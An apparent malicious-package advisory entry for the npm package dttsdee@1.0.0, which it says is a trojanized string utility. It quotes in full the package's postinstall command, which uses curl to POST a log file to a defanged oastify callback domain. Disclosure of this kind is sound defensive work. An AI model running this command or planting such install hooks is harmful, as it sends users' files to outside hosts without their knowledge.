  "summary": "Security-research / proof-of-concept package: dttsdee (npm)",
  "details": "Dttsdee@1.0.0 is a trojanized string-utility package whose postinstall hook silently exfiltrates system data. On npm install, the lifecycle script runs: curl -X POST -d \"$(cat /data/logs/monitor-2026-06-25.log)\" hxxp://3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com/data — it reads the system monitor log file and sends its contents via HTTP POST to the oastify[.]com callback domain 3dhd6wwmusbh04m22igmzvb4hvnmblza[.]oastify[.]com. The bundled utility code is decoy; the malicious behaviour is the postinstall hook.",
